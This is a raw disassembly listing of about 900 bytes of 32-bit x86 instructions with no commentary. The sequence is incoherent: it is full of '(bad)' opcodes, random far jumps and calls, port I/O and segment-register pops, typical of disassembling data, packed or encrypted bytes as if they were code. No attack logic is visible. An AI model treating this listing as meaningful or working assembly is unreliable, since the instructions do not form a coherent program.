  41d0ef:	push   esi
  41d0f0:	mov    esp,0x82705861
  41d0f5:	arpl   WORD PTR [esp+ebp*2+0x233e428],di
  41d0fc:	jae    0x41d0ec
  41d0fe:	in     eax,0x9
  41d100:	call   0x634679e5
  41d105:	mov    ah,0xb9
  41d107:	lds    ebp,FWORD PTR [ecx+eiz*2]
  41d10a:	push   ecx
  41d10b:	jne    0x41d0df
  41d10d:	lahf   
  41d10e:	sbb    eax,edx
  41d110:	fwait
  41d111:	jle    0x41d0ea
  41d113:	hlt    
  41d114:	ret    0xa4
  41d117:	jno    0x41d104
  41d119:	(bad)  
  41d11a:	mov    ebx,0xed902fdc
  41d11f:	clc    
  41d120:	xor    cl,BYTE PTR [edi-0x3cffabc]
  41d126:	sub    eax,0x976e76db
  41d12b:	add    DWORD PTR [edi+0x34],ecx
  41d12e:	gs stos DWORD PTR es:[edi],eax
  41d130:	pop    edx
  41d131:	mov    ds:0x1bcb8d34,eax
  41d136:	add    eax,0x9c1c835f
  41d13b:	push   ss
  41d13c:	mov    ds:0x3a3b6792,al
  41d141:	pop    ecx
  41d142:	fs fs xchg esi,eax
  41d145:	aad    0x40
  41d147:	adc    dh,BYTE PTR [ebx-0x28b5f8c7]
  41d14d:	pop    ss
  41d14e:	pop    edi
  41d14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d150:	add    al,0xd1
  41d152:	in     eax,dx
  41d153:	in     eax,dx
  41d154:	es mov ebx,0xba94947f
  41d15a:	sub    edi,DWORD PTR [ebp+0x39]
  41d15d:	icebp  
  41d15e:	mov    DWORD PTR ds:0xbabf84ed,esi
  41d164:	retf   
  41d165:	jecxz  0x41d121
  41d167:	mov    ecx,0x23762144
  41d16c:	stos   BYTE PTR es:[edi],al
  41d16d:	push   0x3a2d5942
  41d172:	jmp    FWORD PTR [eax-0x2879fdcb]
  41d178:	mov    ch,0x53
  41d17a:	push   0x940e666e
  41d17f:	cmp    bh,cl
  41d181:	mov    esp,0xab8cda8a
  41d186:	fistp  WORD PTR [edx+0x66]
  41d189:	jmp    0x3d67:0x9bfcf711
  41d190:	scas   al,BYTE PTR es:[edi]
  41d191:	in     eax,0x97
  41d193:	popa   
  41d194:	in     eax,0xc
  41d196:	fcom   DWORD PTR [esi+ebp*1]
  41d199:	popf   
  41d19a:	sub    ah,BYTE PTR ds:0xc4799728
  41d1a0:	out    dx,al
  41d1a1:	dec    eax
  41d1a2:	(bad)  
  41d1a3:	fs ja  0x41d183
  41d1a6:	fwait
  41d1a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1a8:	adc    DWORD PTR [ecx-0x3bc81870],edx
  41d1ae:	xor    BYTE PTR [eax+eiz*1+0x2d],al
  41d1b2:	and    al,0xbf
  41d1b4:	jb     0x41d20f
  41d1b6:	popa   
  41d1b7:	xchg   ebp,eax
  41d1b8:	sub    al,0x6e
  41d1ba:	leave  
  41d1bb:	int    0xea
  41d1bd:	push   esi
  41d1be:	test   eax,0x215eb3e4
  41d1c3:	xor    DWORD PTR [edx+0x1b],edi
  41d1c6:	adc    al,0x55
  41d1c8:	inc    ebx
  41d1c9:	mov    al,ds:0x73b129e9
  41d1ce:	in     al,0x3c
  41d1d0:	jb     0x41d220
  41d1d2:	lods   eax,DWORD PTR ds:[esi]
  41d1d3:	lods   al,BYTE PTR ds:[esi]
  41d1d4:	xchg   ebp,eax
  41d1d5:	jp     0x41d228
  41d1d7:	push   cs
  41d1d8:	inc    eax
  41d1d9:	adc    ch,BYTE PTR [edx-0x669cae6]
  41d1df:	cld    
  41d1e0:	mov    edx,0x85c61c85
  41d1e5:	sub    eax,0x4b339e29
  41d1ea:	aad    0x8f
  41d1ec:	sub    esp,esp
  41d1ee:	out    dx,eax
  41d1ef:	shr    DWORD PTR [ecx],0x8e
  41d1f2:	and    al,0xf8
  41d1f4:	outs   dx,BYTE PTR ds:[esi]
  41d1f5:	dec    eax
  41d1f6:	retf   
  41d1f7:	lock jge 0x41d1a0
  41d1fa:	inc    edi
  41d1fb:	les    esi,FWORD PTR [edx]
  41d1fd:	outs   dx,DWORD PTR ds:[esi]
  41d1fe:	adc    bl,BYTE PTR [esi-0x69]
  41d201:	shl    DWORD PTR [esi-0x19],cl
  41d204:	das    
  41d205:	retf   
  41d206:	pop    ebp
  41d207:	outs   dx,BYTE PTR ds:[esi]
  41d208:	test   BYTE PTR [esi-0x75de9b83],0x18
  41d20f:	outs   dx,BYTE PTR ds:[esi]
  41d210:	xchg   edi,eax
  41d211:	loopne 0x41d199
  41d213:	sar    BYTE PTR [ecx],cl
  41d215:	aam    0xe5
  41d217:	adc    edx,0xffffffcf
  41d21a:	dec    esp
  41d21b:	add    DWORD PTR [ebx+0x2c],0xdf6e1891
  41d222:	dec    ebx
  41d223:	and    edx,DWORD PTR cs:[edi-0x68]
  41d227:	nop
  41d228:	pop    ebx
  41d229:	into   
  41d22a:	stos   DWORD PTR es:[edi],eax
  41d22b:	imul   DWORD PTR [ecx+0x19]
  41d22e:	jecxz  0x41d20e
  41d230:	sahf   
  41d231:	in     al,0x96
  41d233:	cmp    eax,0xfdb4ac80
  41d238:	(bad)  
  41d239:	mov    esp,0x237255d9
  41d23e:	test   DWORD PTR [esi+0x1cf55b1f],edi
  41d244:	jge    0x41d235
  41d246:	jp     0x41d214
  41d248:	mov    eax,ds:0x2abac3ef
  41d24d:	sahf   
  41d24e:	push   es
  41d24f:	aaa    
  41d250:	push   esp
  41d251:	lock pop ss
  41d253:	inc    esp
  41d254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d255:	sub    al,0x99
  41d257:	dec    edi
  41d258:	adc    eax,DWORD PTR [ebx+0x20]
  41d25b:	xor    al,0x88
  41d25d:	jb     0x41d28a
  41d25f:	outs   dx,DWORD PTR ds:[esi]
  41d260:	outs   dx,BYTE PTR ds:[esi]
  41d261:	mov    ds:0xd904f059,al
  41d266:	adc    esp,ebx
  41d268:	les    ecx,FWORD PTR [edx]
  41d26a:	cli    
  41d26b:	in     eax,dx
  41d26c:	mov    edx,0x91d2ec21
  41d271:	add    ecx,edx
  41d273:	pop    edi
  41d274:	test   DWORD PTR [ebx+0xa61278],edx
  41d27a:	inc    ecx
  41d27b:	push   ss
  41d27c:	and    al,BYTE PTR [esp+ebx*1-0x20]
  41d280:	xor    DWORD PTR [edx-0x34],edx
  41d283:	jmp    0x4a18ca12
  41d288:	out    dx,eax
  41d289:	mov    cl,0x8b
  41d28b:	sub    DWORD PTR [ebp+0x67219a05],esp
  41d291:	sbb    ah,dh
  41d293:	cld    
  41d294:	test   DWORD PTR [edi],ebp
  41d296:	cmp    eax,0x8e60d8ae
  41d29b:	pop    esi
  41d29c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d29d:	arpl   bx,si
  41d29f:	push   esp
  41d2a0:	int    0xa9
  41d2a2:	hlt    
  41d2a3:	mov    al,ds:0x148c54c9
  41d2a8:	daa    
  41d2a9:	arpl   WORD PTR [edi+ecx*2-0x6f],sp
  41d2ad:	sbb    BYTE PTR [ebx-0x3f],ah
  41d2b0:	shr    BYTE PTR [eax-0x5b],1
  41d2b3:	(bad)  
  41d2b4:	fcompp 
  41d2b6:	sti    
  41d2b7:	out    0x5,al
  41d2b9:	test   DWORD PTR [ecx+esi*1],0xbef1878e
  41d2c0:	jle    0x41d2de
  41d2c2:	retf   0x1998
  41d2c5:	data16 and ah,BYTE PTR [esi]
  41d2c8:	sub    bh,BYTE PTR [ebp-0x1c]
  41d2cb:	xor    al,0x33
  41d2cd:	repz pusha 
  41d2cf:	std    
  41d2d0:	mov    WORD PTR [edx+0x614c917d],ds
  41d2d6:	ret    0x9680
  41d2d9:	sub    bh,BYTE PTR [edi]
  41d2db:	repz fcmovnu st,st(2)
  41d2de:	add    eax,0x59acc02c
  41d2e3:	or     BYTE PTR [edx+ebx*4-0x4],al
  41d2e7:	add    al,0xff
  41d2e9:	cld    
  41d2ea:	push   esp
  41d2eb:	mov    edi,0xf7a61799
  41d2f0:	imul   BYTE PTR [ecx]
  41d2f2:	hlt    
  41d2f3:	lods   eax,DWORD PTR ds:[esi]
  41d2f4:	push   dx
  41d2f6:	mov    esi,0x733bcfc8
  41d2fb:	retf   
  41d2fc:	out    dx,al
  41d2fd:	js     0x41d286
  41d2ff:	stos   DWORD PTR es:[edi],eax
  41d300:	pop    ss
  41d301:	jb     0x41d336
  41d303:	add    BYTE PTR [edi],dl
  41d305:	xor    eax,DWORD PTR [eax+eax*4]
  41d308:	pop    ecx
  41d309:	mov    ebp,0x31049834
  41d30e:	pop    ss
  41d30f:	in     al,dx
  41d310:	push   ecx
  41d311:	inc    edx
  41d312:	sub    eax,0x7468d15b
  41d317:	inc    ebp
  41d318:	sbb    eax,0xf883a2e3
  41d31d:	sar    bh,1
  41d31f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d320:	leave  
  41d321:	daa    
  41d322:	aad    0xd0
  41d324:	in     eax,dx
  41d325:	ror    BYTE PTR ds:0x2353ba4a,cl
  41d32b:	lods   al,BYTE PTR ds:[esi]
  41d32c:	lds    esp,FWORD PTR [esi-0x33693b68]
  41d332:	in     eax,dx
  41d333:	int    0x4f
  41d335:	retf   
  41d336:	jo     0x41d2d7
  41d338:	cmp    DWORD PTR [edx-0x7d],edi
  41d33b:	retf   
  41d33c:	aas    
  41d33d:	sub    esi,DWORD PTR [ebx+ecx*4]
  41d340:	add    eax,0x7db146bc
  41d345:	mov    es,eax
  41d347:	shl    ah,cl
  41d349:	pusha  
  41d34a:	push   esp
  41d34b:	in     al,0x78
  41d34d:	jne    0x41d2d4
  41d34f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d350:	push   ebx
  41d351:	int    0x76
  41d353:	sub    eax,DWORD PTR [ebp-0x6aa1b697]
  41d359:	add    BYTE PTR [edx-0x65],0x20
  41d35d:	jae    0x41d376
  41d35f:	mov    esi,0x1394c683
  41d364:	push   edi
  41d365:	pusha  
  41d366:	mov    al,0x57
  41d368:	leave  
  41d369:	mov    al,ds:0xf4911b6f
  41d36e:	jb     0x41d336
  41d370:	dec    esi
  41d371:	sbb    bl,bh
  41d373:	fs stos DWORD PTR es:[edi],eax
  41d375:	retf   
  41d376:	or     DWORD PTR [esi+0x14],0x50
  41d37a:	call   0xd29a:0xaa5dd7e1
  41d381:	jmp    0xf1ce:0x7e088ed2
  41d388:	cmp    ebp,DWORD PTR [ebx-0x67b36036]
  41d38e:	test   DWORD PTR [eax+ebx*1],edx
  41d391:	xchg   BYTE PTR [eax+0x12],dl
  41d394:	test   DWORD PTR ds:0x14200dc0,edx
  41d39a:	inc    ecx
  41d39c:	les    ecx,FWORD PTR ds:0x78fcc70b
  41d3a2:	in     eax,0xfe
  41d3a4:	xlat   BYTE PTR ds:[ebx]
  41d3a5:	inc    edx
  41d3a6:	sub    al,0x47
  41d3a8:	push   0xb39bbc30
  41d3ad:	jns    0x41d415
  41d3af:	mov    dl,0x42
  41d3b1:	sbb    DWORD PTR [eax],ebx
  41d3b3:	add    al,0xac
  41d3b5:	test   DWORD PTR [ecx-0x20d621e7],ebx
  41d3bb:	loop   0x41d35a
  41d3bd:	pop    ss
  41d3be:	add    DWORD PTR [ecx-0x6b],ecx
  41d3c1:	test   BYTE PTR [edi-0x12],al
  41d3c4:	push   ecx
  41d3c5:	ins    BYTE PTR es:[edi],dx
  41d3c6:	sbb    al,0xbf
  41d3c8:	loope  0x41d350
  41d3ca:	or     DWORD PTR [ebp+0x28],0xafc15d1c
  41d3d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d2:	push   0x68e9a2ba
  41d3d7:	ss jnp 0x41d43d
  41d3da:	pop    esi
  41d3db:	sub    BYTE PTR [esi-0x27],ah
  41d3de:	sahf   
  41d3df:	loopne 0x41d395
  41d3e1:	xor    bl,dh
  41d3e3:	dec    ebp
  41d3e4:	out    0x2a,al
  41d3e6:	js     0x41d44c
  41d3e8:	scas   al,BYTE PTR es:[edi]
  41d3e9:	fs jecxz 0x41d439
  41d3ec:	pop    eax
  41d3ed:	push   ecx
  41d3ee:	adc    eax,0x777708c5
  41d3f3:	mov    DWORD PTR [edx+eax*2],esp
  41d3f6:	push   ecx
  41d3f7:	jecxz  0x41d39d
  41d3f9:	add    DWORD PTR [ebp-0x7f26bc9d],eax
  41d3ff:	jl     0x41d40d
  41d401:	adc    DWORD PTR [esi],esp
  41d403:	push   0x56
  41d405:	jbe    0x41d451
  41d407:	dec    ebx
  41d408:	dec    esp
  41d409:	push   ds
  41d40a:	mov    ds:0x4756b756,al
  41d40f:	jg     0x41d45a
  41d411:	xor    BYTE PTR [edx],dl
  41d413:	mov    gs,edi
  41d415:	adc    ch,BYTE PTR [ebx-0x6]
  41d418:	stos   BYTE PTR es:[edi],al
  41d419:	in     al,0x43
  41d41b:	lea    edx,[ecx]
  41d41d:	lock loopne 0x41d3ec
  41d420:	push   edx
  41d421:	jmp    0x8e9f955b
  41d426:	lds    esi,FWORD PTR [eax]
  41d428:	adc    eax,0x1c212f9d
  41d42d:	fbstp  TBYTE PTR [ecx]
  41d42f:	fisttp QWORD PTR [ebx]
  41d431:	pop    ds
  41d432:	aam    0x2d
  41d434:	pop    esi
  41d435:	jno    0x41d3ea
  41d437:	jl     0x41d402
  41d439:	jl     0x41d45a
  41d43b:	je     0x41d4a1
  41d43d:	jo     0x41d3f8
  41d43f:	adc    al,bh
  41d441:	or     eax,edx
  41d443:	mov    WORD PTR [ecx],ds
  41d445:	mov    eax,ds:0xbdf9fb2c
  41d44a:	pop    esi
  41d44b:	call   0x6c7aa79c
  41d450:	cmp    eax,0xe5a013c6
  41d455:	fimul  DWORD PTR [edi+eiz*8]
  41d458:	cs in  al,dx
  41d45a:	call   0x9bd0:0xe606b74a
  41d461:	adc    DWORD PTR [edx+0x1c90af80],edi
  41d467:	out    dx,al
  41d468:	inc    ebx
  41d469:	dec    edi
  41d46a:	loop   0x41d48b
  41d46c:	stos   DWORD PTR es:[edi],eax
  41d46d:	push   edi
  41d46e:	mov    WORD PTR [edi+0x28],?
  41d471:	out    dx,eax
  41d472:	fadd   DWORD PTR [ecx+ecx*2-0x3c]
  41d476:	jecxz  0x41d469
  41d478:	jo     0x41d4a8
  41d47a:	call   0x5c5f4eb5
  41d47f:	jg     0x41d488
  41d481:	push   edx
  41d482:	pop    eax
  41d483:	adc    DWORD PTR [esp+edx*1+0x7a],eax
  41d487:	push   edi
  41d488:	jl     0x41d434
  41d48a:	cdq    
  41d48b:	leave  
  41d48c:	xor    DWORD PTR [eax-0x3a],0xa
  41d490:	outs   dx,DWORD PTR ds:[esi]
  41d491:	outs   dx,BYTE PTR ds:[esi]
  41d492:	sahf   
  41d493:	adc    DWORD PTR [ebp+0x5d],ecx
  41d496:	xchg   BYTE PTR [edx+ebx*2],cl
  41d499:	retf   
  41d49a:	imul   ebp,DWORD PTR [ebx-0x59],0xffffffdb
  41d49e:	adc    edi,DWORD PTR [edi+0x1630a7a9]
  41d4a4:	adc    cl,dl
  41d4a6:	fnstcw WORD PTR [ebp-0x5e29611f]
  41d4ac:	xchg   dh,bh
  41d4ae:	gs pushf 
  41d4b0:	push   ss
  41d4b1:	mov    ds:0x97179dfc,eax
  41d4b6:	and    al,0x7d
  41d4b8:	scas   al,BYTE PTR es:[edi]
  41d4b9:	call   0x2f27e886
  41d4be:	hlt    
  41d4bf:	xor    al,0xbe
  41d4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4c2:	mov    al,0xe9
  41d4c4:	lock push es
  41d4c6:	xor    DWORD PTR [ebx+0x76],edi
  41d4c9:	xchg   edi,eax
  41d4ca:	jmp    0x45891142
  41d4cf:	ins    DWORD PTR es:[edi],dx
  41d4d0:	cmp    al,0x40
  41d4d2:	pop    ebp
  41d4d3:	shl    BYTE PTR [ecx-0x1f],cl
  41d4d6:	int3   
  41d4d7:	sbb    esi,ebx
  41d4d9:	fld    QWORD PTR [esi-0x6f]
  41d4dc:	xchg   bl,dh
  41d4de:	bound  edx,QWORD PTR [eax-0x62482092]
  41d4e4:	pop    ebp
  41d4e5:	stos   DWORD PTR es:[edi],eax
  41d4e6:	pop    ebp
  41d4e7:	push   ebp
  41d4e8:	sbb    al,0xcb
  41d4ea:	push   edx
  41d4eb:	push   0x57
  41d4ed:	int3   
  41d4ee:	ja     0x41d55e
  41d4f0:	dec    ecx
  41d4f1:	mov    WORD PTR [ebx-0x21f58ede],cs
  41d4f7:	jae    0x41d529
  41d4f9:	out    dx,al
  41d4fa:	jmp    0x41d4c5
  41d4fc:	fcmovu st,st(4)
  41d4fe:	sub    eax,0xdc6426ca
  41d503:	das    
  41d504:	cmp    al,0x71
  41d506:	pop    es
  41d507:	push   ds
  41d508:	pop    esp
  41d509:	dec    ebp
  41d50a:	sbb    ah,ah
  41d50c:	test   bl,dl
  41d50e:	push   ss
  41d50f:	rcl    BYTE PTR [edi-0x195966d9],cl
  41d515:	jbe    0x41d577
  41d517:	rcl    dh,0x26
  41d51a:	add    al,0x73
  41d51c:	fwait
  41d51d:	lods   eax,DWORD PTR ds:[esi]
  41d51e:	les    edi,FWORD PTR [esi-0x28]
  41d521:	xchg   esp,eax
  41d522:	jp     0x41d4da
  41d524:	xor    BYTE PTR [esi-0x6a4d811a],bl
  41d52a:	pop    es
  41d52b:	and    ch,BYTE PTR [eax+edx*8]
  41d52e:	xchg   ebp,eax
  41d52f:	jge    0x41d536
  41d531:	or     bh,BYTE PTR [eax+ebp*1+0xc]
  41d535:	adc    BYTE PTR [eax+0xa],dh
  41d538:	sbb    eax,esp
  41d53a:	or     dh,BYTE PTR [eax-0x2a]
  41d53d:	push   ecx
  41d53e:	mov    bl,BYTE PTR [ebp+ecx*2-0x4a8588d4]
  41d545:	dec    ebx
  41d546:	mov    dl,al
  41d548:	jb     0x41d4cf
  41d54a:	sbb    DWORD PTR [ebx+0x16],edi
  41d54d:	aaa    
  41d54e:	mov    cl,0xa1
  41d550:	outs   dx,BYTE PTR ds:[esi]
  41d551:	shl    BYTE PTR [ecx-0x4a],cl
  41d554:	(bad)  
  41d555:	push   es
  41d556:	or     al,0xf7
  41d558:	clc    
  41d559:	cmp    al,0x18
  41d55b:	(bad)  
  41d55c:	pop    ebp
  41d55d:	aas    
  41d55e:	and    esi,esi
  41d560:	imul   DWORD PTR [eax+0x9]
  41d563:	(bad)  
  41d564:	pop    esp
  41d565:	vshufps ymm3,ymm2,ymm5,0xcd
  41d56a:	mov    dl,BYTE PTR [edx]
  41d56c:	call   0xe67951e0
  41d571:	add    BYTE PTR [ebx+edi*1-0x4253e84a],al
  41d578:	jo     0x41d57a
  41d57a:	into   
  41d57b:	aad    0x2
  41d57d:	inc    esi
  41d57e:	cmp    al,0x16
  41d580:	xchg   ecx,eax
  41d581:	mov    BYTE PTR [esi+0x143f4f6d],dh
  41d587:	std    
  41d588:	mov    BYTE PTR [esi-0x43],bl
  41d58b:	call   0x16dd460c
  41d590:	push   es
  41d591:	push   ebp
  41d592:	add    ecx,DWORD PTR [edx-0x1f07de68]
  41d598:	xor    eax,0xfd03ad49
  41d59d:	mov    ecx,0x693c5c5b
  41d5a2:	pop    ebp
  41d5a3:	shr    esp,cl
  41d5a5:	jbe    0x41d5ce
  41d5a7:	or     DWORD PTR ds:0x696165d1,ebp
  41d5ad:	xor    DWORD PTR [esi+0x2f],0x74
  41d5b1:	iret   
  41d5b2:	call   0xd5ef72ca
  41d5b7:	(bad)  
  41d5b8:	pusha  
  41d5b9:	mov    eax,0x7f753ef0
  41d5be:	ficomp DWORD PTR es:[esi-0x6d]
  41d5c2:	sahf   
  41d5c3:	call   0xf0ca7fd6
  41d5c8:	mov    edx,0x4a4ad1e2
  41d5cd:	sbb    al,0x10
  41d5cf:	repnz sti 
  41d5d1:	mov    ds:0x7a8a9dc4,eax
  41d5d6:	cs retf 
  41d5d8:	pop    ebp
  41d5d9:	xor    DWORD PTR [eax-0x43f1e01f],ebp
  41d5df:	and    eax,DWORD PTR [ebx]
  41d5e1:	data16 ins BYTE PTR es:[edi],dx
  41d5e3:	xchg   edi,eax
  41d5e4:	popf   
  41d5e5:	xor    eax,0x4cac6e57
  41d5ea:	push   ecx
  41d5eb:	jmp    0x41d60c
  41d5ed:	stos   BYTE PTR es:[edi],al
  41d5ee:	bound  ecx,QWORD PTR [edi-0x7a1beba5]
  41d5f4:	fnsave [ecx-0x43]
  41d5f7:	or     DWORD PTR [esi+0x18],0xffffffea
  41d5fb:	fsubp  st(3),st
  41d5fd:	es ret 
  41d5ff:	or     BYTE PTR [esi-0x33fddcbc],dh
  41d605:	das    
  41d606:	out    dx,al
  41d607:	ja     0x41d5a2
  41d609:	add    al,0x8b
  41d60b:	push   edx
  41d60c:	xor    DWORD PTR [ebx+ebx*8-0x78],0xffffffde
  41d611:	scas   eax,DWORD PTR es:[edi]
  41d612:	adc    DWORD PTR [eax],ecx
  41d614:	mov    al,ds:0x1700d5ca
  41d619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d61a:	clc    
  41d61b:	jle    0x41d5b0
  41d61d:	popf   
  41d61e:	ins    BYTE PTR es:[edi],dx
  41d61f:	pop    edi
  41d620:	push   esi
  41d621:	loopne 0x41d677
  41d623:	xchg   esp,eax
  41d624:	dec    edx
  41d626:	out    0xca,al
  41d628:	cwde   
  41d629:	enter  0x5720,0x7d
  41d62d:	dec    edi
  41d62e:	jo     0x41d60a
  41d630:	ins    BYTE PTR es:[edi],dx
  41d631:	push   ss
  41d632:	(bad)  
  41d633:	pop    edi
  41d634:	xchg   ebp,eax
  41d635:	dec    esp
  41d636:	fild   WORD PTR [eax]
  41d638:	mov    ebp,0xf6dc94f7
  41d63d:	repz mov al,ds:0x19ce79c4
  41d643:	fistp  WORD PTR [edi]
  41d645:	fsub   st,st(1)
  41d647:	js     0x41d605
  41d649:	inc    ebp
  41d64a:	inc    edx
  41d64b:	mov    BYTE PTR [ebp-0x63],bh
  41d64e:	pop    ebx
  41d64f:	aas    
  41d650:	sahf   
  41d651:	adc    ax,ax
  41d654:	mov    BYTE PTR [ebx-0x3dd275ab],dl
  41d65a:	jl     0x41d692
  41d65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d65d:	or     al,0x81
  41d65f:	or     DWORD PTR [esi+eax*1],edi
  41d662:	pop    ebx
  41d663:	gs mov dh,0x90
  41d666:	lods   al,BYTE PTR ds:[esi]
  41d667:	imul   eax,DWORD PTR [eax+edi*2+0x3b],0x69
  41d66c:	sbb    BYTE PTR [ebp+0x3fd10aa7],ah
  41d672:	stc    
  41d673:	dec    esi
  41d674:	inc    eax
  41d675:	mov    ah,0xff
  41d677:	dec    eax
  41d678:	repz pushf 
  41d67a:	pop    eax
  41d67b:	or     DWORD PTR [ecx+ebx*8-0x66e66ec4],ebx
  41d682:	pop    edx
  41d683:	bnd addr16 ret 
  41d686:	gs cld 
  41d688:	jl     0x41d64c
  41d68a:	je     0x41d685
  41d68c:	fs push ds
  41d68e:	data16 cli 
  41d690:	out    dx,eax
  41d691:	mov    ebp,0x52212c9d
  41d696:	add    BYTE PTR [esi],dh
  41d698:	push   edx
  41d699:	daa    
  41d69a:	adc    dl,BYTE PTR [ecx-0x1ff37715]
  41d6a0:	xchg   esi,eax
  41d6a1:	pushf  
  41d6a2:	or     BYTE PTR [eax-0x7c],dl
  41d6a5:	inc    ecx
  41d6a6:	adc    al,ch
  41d6a8:	jae    0x41d64b
  41d6aa:	mov    ecx,0x44ded712
  41d6af:	jnp    0x41d67a
  41d6b1:	or     eax,0xd2c68b0a
  41d6b6:	dec    ebx
  41d6b7:	les    esp,FWORD PTR [esi-0x10e7bb7d]
  41d6bd:	into   
  41d6be:	or     al,0x22
  41d6c0:	and    ebp,DWORD PTR [ecx+0x3ffc0fb8]
  41d6c6:	adc    DWORD PTR [esi+0x79],ecx
  41d6c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6ca:	xor    edx,ecx
  41d6cc:	and    BYTE PTR [edx*4+0x22df9d2c],ah
  41d6d3:	xor    al,0x4d
  41d6d5:	loop   0x41d6fb
  41d6d7:	jae    0x41d699
  41d6d9:	in     eax,dx
  41d6da:	and    ebp,esi
  41d6dc:	lods   al,BYTE PTR ds:[esi]
  41d6dd:	cmp    DWORD PTR [edx+0x45],ebp
  41d6e0:	mov    dl,0xb3
  41d6e2:	or     BYTE PTR [edx+0x456eea28],bh
  41d6e8:	in     eax,dx
  41d6e9:	clc    
  41d6ea:	out    dx,al
  41d6eb:	push   cs
  41d6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ed:	push   esi
  41d6ee:	push   ss
  41d6ef:	push   esi
  41d6f0:	or     DWORD PTR [eax-0x5c],esi
  41d6f3:	std    
  41d6f4:	leave  
  41d6f5:	pushf  
  41d6f6:	sti    
  41d6f7:	xlat   BYTE PTR ds:[ebx]
  41d6f8:	lea    eax,[eax-0x67]
  41d6fb:	js     0x41d74a
  41d6fd:	add    ah,BYTE PTR [eax+0x333c967d]
  41d703:	nop
  41d704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d705:	addr16 pop ecx
  41d707:	sbb    DWORD PTR [esi+0xa],ebx
  41d70a:	bound  ebp,QWORD PTR [ebx]
  41d70c:	jns    0x41d6bc
  41d70e:	jb     0x41d771
  41d710:	out    0x98,eax
  41d712:	jae    0x930e59c7
  41d718:	nop
  41d719:	fist   DWORD PTR [ecx-0x15]
  41d71c:	out    0x52,eax
  41d71e:	mov    esi,0x4fa49de3
  41d723:	mov    edi,0x3863f0e1
  41d728:	ds (bad) 
  41d72b:	add    esi,ecx
  41d72d:	xor    ebx,DWORD PTR [edx-0xa]
  41d730:	and    BYTE PTR ds:0x22ee0f86,ch
  41d736:	(bad)  
  41d738:	mov    esi,0xdced0f2f
  41d73d:	sub    ch,BYTE PTR [ecx-0x33]
  41d740:	cmc    
  41d741:	xchg   esp,eax
  41d742:	or     eax,0x3878b9b9
  41d747:	xor    eax,0x62cf2941
  41d74c:	jmp    0x41d77d
  41d74e:	xchg   edx,eax
  41d74f:	push   ebx
  41d750:	aas    
  41d751:	mov    bh,BYTE PTR [ecx-0x6]
  41d754:	sbb    edx,DWORD PTR ds:0xb40d7c81
  41d75a:	mov    ch,0x49
  41d75c:	bnd jae 0x41d750
  41d75f:	dec    ebp
  41d760:	inc    ebx
  41d761:	xchg   ebp,eax
  41d762:	pop    eax
  41d763:	jae    0x41d796
  41d765:	jge    0x41d775
  41d767:	or     BYTE PTR [edi],dh
  41d769:	cmp    bl,bh
  41d76b:	stos   DWORD PTR es:[edi],eax
  41d76c:	out    dx,eax
  41d76d:	sub    ch,bh
  41d76f:	hlt    
  41d770:	mov    ch,0x60
  41d772:	dec    esp
  41d773:	cmp    BYTE PTR [edx-0x2c],dh
  41d776:	xchg   esi,eax
  41d777:	xor    ecx,esi
  41d779:	xchg   esi,eax
  41d77a:	imul   esi,DWORD PTR [esi-0xf],0xe
  41d77e:	mov    BYTE PTR [ebx],0x7a
  41d781:	xchg   edi,eax
  41d782:	mov    al,ds:0x8f8f82ff
  41d787:	push   esi
  41d788:	fimul  DWORD PTR ds:[ecx]
  41d78b:	jne    0x41d7c3
  41d78d:	mov    BYTE PTR [esi],0x2b
  41d790:	and    ebx,DWORD PTR [esi+0x163a1595]
  41d796:	sar    DWORD PTR [eax],0xae
  41d799:	xor    bl,BYTE PTR [ebx+0x2ab8c64e]
  41d79f:	aas    
  41d7a0:	(bad)  
  41d7a1:	fsubr  DWORD PTR [ecx]
  41d7a3:	mov    edx,0x70c747
  41d7a8:	bound  eax,QWORD PTR ds:0xc647cd57
  41d7ae:	lahf   
  41d7af:	adc    edi,esp
  41d7b1:	daa    
  41d7b2:	mov    esi,0xe2d82796
  41d7b7:	jns    0x41d7f3
  41d7b9:	xor    edi,0xf2232097
  41d7bf:	dec    ebp
  41d7c0:	outs   dx,BYTE PTR ds:[esi]
  41d7c1:	in     eax,dx
  41d7c2:	jmp    0x97cf282
  41d7c7:	or     edx,DWORD PTR [ebp-0xe]
  41d7ca:	and    DWORD PTR [esi-0x4722bf45],esp
  41d7d0:	jns    0x41d75d
  41d7d2:	std    
  41d7d3:	add    BYTE PTR [eax],bl
  41d7d5:	sar    BYTE PTR [ecx-0x7b39a503],cl
  41d7db:	push   ecx
  41d7dc:	cmc    
  41d7dd:	repnz test al,0x5d
  41d7e0:	push   esp
  41d7e1:	daa    
  41d7e2:	dec    esp
  41d7e3:	mov    ds:0xf91d670e,al
  41d7e8:	out    dx,eax
  41d7e9:	sbb    ch,BYTE PTR [ebx+0x3dba5ff]
  41d7ef:	pop    esi
  41d7f0:	retf   
  41d7f1:	mov    al,cl
  41d7f3:	mov    eax,0x1ec8b4b6
  41d7f8:	sbb    al,0xab
  41d7fa:	dec    esp
  41d7fb:	int3   
  41d7fc:	popf   
  41d7fd:	push   esi
  41d7fe:	xor    DWORD PTR [eax],0xffffffe2
  41d801:	std    
  41d802:	mov    ebp,0x4d3d2009
  41d807:	in     eax,0x2c
  41d809:	int3   
  41d80a:	int    0x27
  41d80c:	sub    BYTE PTR ds:0x4975f61b,cl
  41d812:	dec    ebx
  41d813:	aam    0xdc
  41d815:	or     ebp,edx
  41d817:	mov    edx,0xb969e41c
  41d81c:	add    dh,dl
  41d81e:	xchg   esp,eax
  41d81f:	pushf  
  41d820:	jbe    0x41d7ee
  41d822:	fs sti 
  41d824:	fld1   
  41d826:	inc    ebp
  41d827:	pop    edx
  41d828:	sub    ch,ch
  41d82a:	mov    ch,0x7
  41d82c:	fs ret 
  41d82e:	push   eax
  41d82f:	popa   
